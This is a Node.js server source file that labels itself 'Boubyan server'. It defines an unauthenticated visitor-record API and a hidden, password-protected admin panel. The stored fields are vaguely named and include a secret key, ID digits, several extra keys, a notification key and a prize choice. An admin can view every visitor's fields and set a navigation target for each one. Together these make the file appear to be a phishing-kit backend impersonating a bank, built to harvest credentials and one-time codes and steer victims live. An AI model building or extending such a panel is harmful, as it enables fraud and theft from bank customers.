import http from "node:http";
import { randomBytes, randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createServer as createViteServer } from "vite";
import pg from "pg";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const isDev = process.argv[2] === "dev";
const port = Number(process.env.PORT || (isDev ? 5173 : 3000));
const adminPassword = process.env.ADMIN_PASSWORD || null;
const pool = process.env.DATABASE_URL
  ? new pg.Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false },
      max: 5,
    })
  : null;

// تحويل ? إلى $1,$2,... لـ PostgreSQL
const query = (sql, params = []) => {
  if (!pool) throw new Error("database_not_configured");
  let i = 0;
  const pgSql = sql.replace(/\?/g, () => `$${++i}`);
  return pool.query(pgSql, params).then((r) => [r.rows, r.fields]);
};

const json = (res, status, body) => {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.end(JSON.stringify(body));
};

const readBody = async (req) => {
  let raw = "";
  for await (const chunk of req) raw += chunk;
  if (!raw) return {};
  try {
    return JSON.parse(raw);
  } catch {
    throw new Error("invalid_json");
  }
};

// ── Admin sessions (in-memory, reset on restart) ──────────────────────────────
const adminSessions = new Map(); // token → expiresAt (ms)
const SESSION_TTL_MS = 8 * 60 * 60 * 1000; // 8 hours

// ── Rate limiting (per IP) ─────────────────────────────────────────────────────
const authRateLimits = new Map(); // ip → { count, resetAt }
const RATE_LIMIT_MAX = 5;
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 minutes

function checkRateLimit(ip) {
  const now = Date.now();
  const entry = authRateLimits.get(ip);
  if (!entry || now > entry.resetAt) {
    authRateLimits.set(ip, { count: 1, resetAt: now + RATE_LIMIT_WINDOW_MS });
    return true;
  }
  if (entry.count >= RATE_LIMIT_MAX) return false;
  entry.count++;
  return true;
}

function getAdminSessionToken(req) {
  const cookie = req.headers.cookie || "";
  const match = cookie.match(/(?:^|;\s*)__asid=([^;]+)/);
  return match ? decodeURIComponent(match[1]) : null;
}

const isAdmin = (req) => {
  const token = getAdminSessionToken(req);
  if (!token) return false;
  const expiresAt = adminSessions.get(token);
  if (!expiresAt || Date.now() > expiresAt) {
    adminSessions.delete(token);
    return false;
  }
  return true;
};
const visitorColumns =
  "id, contact_ref, contact_name, contact_address, contact_extra, member_label, secret_key_a, id_tail, extra_key_a, extra_key_b, extra_key_c, extra_key_d, extra_key_e, notify_key, stage_key, stage_state, prize_choice, nav_target, last_seen_at, created_at, updated_at";
const publicVisitorColumns = "id, stage_state, nav_target, last_seen_at";
const allowedPatchFields = new Set([
  "contact_ref", "contact_name", "contact_address", "contact_extra", "member_label", "secret_key_a", "id_tail",
  "extra_key_a", "extra_key_b", "extra_key_c", "extra_key_d", "extra_key_e", "notify_key",
  "stage_key", "stage_state", "prize_choice", "nav_target", "last_seen_at",
]);
const normalizeValue = (key, value) => {
  if (key !== "last_seen_at" || typeof value !== "string") return value;
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return value;
  return date.toISOString().slice(0, 23).replace("T", " ");
};

async function hasVisitorAccess(req, id) {
  const token = req.headers["x-visitor-token"];
  if (typeof token !== "string" || !token) return false;
  const [rows] = await query(
    "SELECT id FROM river_nodes WHERE id = ? AND visitor_token = ? LIMIT 1",
    [id, token],
  );
  return rows.length > 0;
}

async function handleApi(req, res, url) {
  res.setHeader("Cache-Control", "no-store");
  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    return res.end();
  }
  // ── Admin login ───────────────────────────────────────────────────────────────
  if (url.pathname === "/api/admin/login") {
    if (req.method !== "POST") return json(res, 405, { error: "method_not_allowed" });
    const ip = req.socket?.remoteAddress || req.headers["x-forwarded-for"] || "unknown";
    if (!checkRateLimit(ip)) return json(res, 429, { error: "too_many_requests" });
    const body = await readBody(req);
    if (!adminPassword || body.password !== adminPassword) {
      return json(res, 401, { error: "unauthorized" });
    }
    const token = randomBytes(32).toString("hex");
    adminSessions.set(token, Date.now() + SESSION_TTL_MS);
    const maxAge = Math.floor(SESSION_TTL_MS / 1000);
    res.setHeader("Set-Cookie", `__asid=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAge}`);
    return json(res, 200, { ok: true });
  }

  // ── Admin logout ──────────────────────────────────────────────────────────────
  if (url.pathname === "/api/admin/logout") {
    if (req.method !== "POST") return json(res, 405, { error: "method_not_allowed" });
    const token = getAdminSessionToken(req);
    if (token) adminSessions.delete(token);
    res.setHeader("Set-Cookie", "__asid=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
    return json(res, 200, { ok: true });
  }

  // ── Admin session check ───────────────────────────────────────────────────────
  if (url.pathname === "/api/admin/me") {
    if (req.method !== "GET") return json(res, 405, { error: "method_not_allowed" });
    return json(res, isAdmin(req) ? 200 : 401, { authenticated: isAdmin(req) });
  }

  if (!url.pathname.startsWith("/api/visitors")) return false;
  if (!pool) return json(res, 503, { error: "database_not_configured" });

  try {
    const parts = url.pathname.split("/").filter(Boolean);
    const id = parts[2] || null;

    if (req.method === "GET" && !id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      const [rows] = await query(
        `SELECT ${visitorColumns} FROM river_nodes ORDER BY last_seen_at DESC, created_at DESC, id DESC`,
      );
      return json(res, 200, rows);
    }

    if (req.method === "GET" && id) {
      const admin = isAdmin(req);
      if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
      const columns = admin ? visitorColumns : publicVisitorColumns;
      const [rows] = await query(`SELECT ${columns} FROM river_nodes WHERE id = ? LIMIT 1`, [id]);
      return json(res, 200, rows[0] ?? null);
    }

    if (req.method === "POST" && !id) {
      const body = await readBody(req);
      const entries = Object.entries(body).filter(([key, value]) => allowedPatchFields.has(key) && value !== undefined);
      if (!body.contact_ref || !entries.some(([key]) => key === "contact_ref")) {
        return json(res, 400, { error: "contact_ref_required" });
      }
      const columns = ["id", "visitor_token", ...entries.map(([key]) => key)];
      const values = [randomUUID(), randomBytes(32).toString("hex"), ...entries.map(([key, value]) => normalizeValue(key, value))];
      const placeholders = columns.map(() => "?").join(", ");
      const [rows] = await query(
        `INSERT INTO river_nodes (${columns.join(", ")}) VALUES (${placeholders}) RETURNING id, visitor_token`,
        values,
      );
      return json(res, 201, rows[0] ?? null);
    }

    if (req.method === "PATCH" && id) {
      const admin = isAdmin(req);
      if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
      const body = await readBody(req);
      const entries = Object.entries(body).filter(([key, value]) => allowedPatchFields.has(key) && value !== undefined);
      if (!entries.length) return json(res, 400, { error: "empty_update" });
      const assignments = entries.map(([key]) => `${key} = ?`).join(", ");
      const values = entries.map(([key, value]) => normalizeValue(key, value));
      values.push(id);
      await query(`UPDATE river_nodes SET ${assignments}, updated_at = NOW() WHERE id = ?`, values);
      const columns = admin ? visitorColumns : publicVisitorColumns;
      const [rows] = await query(`SELECT ${columns} FROM river_nodes WHERE id = ?`, [id]);
      return json(res, 200, rows[0] ?? null);
    }

    if (req.method === "DELETE" && !id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      await query("DELETE FROM river_nodes");
      return json(res, 200, { ok: true });
    }

    if (req.method === "DELETE" && id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      await query("DELETE FROM river_nodes WHERE id = ?", [id]);
      return json(res, 200, { ok: true });
    }

    return json(res, 405, { error: "method_not_allowed" });
  } catch (error) {
    console.error("API error", error instanceof Error ? error.message : error);
    return json(res, 500, { error: "database_error" });
  }
}

async function serveStatic(req, res, url) {
  const requested = decodeURIComponent(url.pathname === "/" ? "/index.html" : url.pathname);
  const candidate = path.resolve(__dirname, "dist", `.${requested}`);
  const root = path.resolve(__dirname, "dist");
  const filePath = candidate === root || candidate.startsWith(`${root}${path.sep}`) ? candidate : null;
  const contentTypes = {
    ".html": "text/html; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".mjs": "application/javascript; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".svg": "image/svg+xml",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".webp": "image/webp",
    ".gif": "image/gif",
    ".ico": "image/x-icon",
    ".txt": "text/plain; charset=utf-8",
  };
  try {
    const stat = filePath ? await fs.stat(filePath) : null;
    if (stat.isFile()) {
      const content = await fs.readFile(filePath);
      res.setHeader("Content-Type", contentTypes[path.extname(filePath).toLowerCase()] || "application/octet-stream");
      res.statusCode = 200;
      res.end(content);
      return;
    }
  } catch {}

  if (path.extname(requested)) {
    res.statusCode = 404;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("Not found");
    return;
  }

  const html = await fs.readFile(path.join(root, "index.html"));
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.statusCode = 200;
  res.end(html);
}

const vite = isDev
  ? await createViteServer({ server: { middlewareMode: true }, appType: "spa" })
  : null;

const ADMIN_PATH = "/manage-hub";

function addSecurityHeaders(res) {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  addSecurityHeaders(res);

  if (url.pathname === "/healthz") {
    return json(res, 200, { ok: true, databaseConfigured: Boolean(pool) });
  }

  if (url.pathname.startsWith("/api/")) {
    const handled = await handleApi(req, res, url);
    if (!handled && !res.writableEnded) json(res, 404, { error: "not_found" });
    return;
  }

  // ── حماية صفحة الأدمن على مستوى الخادم ──────────────────────────────────────
  if (url.pathname === ADMIN_PATH && !isAdmin(req)) {
    res.statusCode = 302;
    res.setHeader("Location", "/");
    res.end();
    return;
  }

  if (vite) {
    vite.middlewares(req, res, () => res.end());
    return;
  }
  await serveStatic(req, res, url);
});

server.listen(port, "0.0.0.0", () => {
  console.log(`Boubyan server listening on port ${port}`);
});

const shutdown = async () => {
  if (pool) await pool.end();
  server.close();
  if (vite) await vite.close();
};
process.on("SIGTERM", shutdown);
process.on("SIGINT", shutdown);
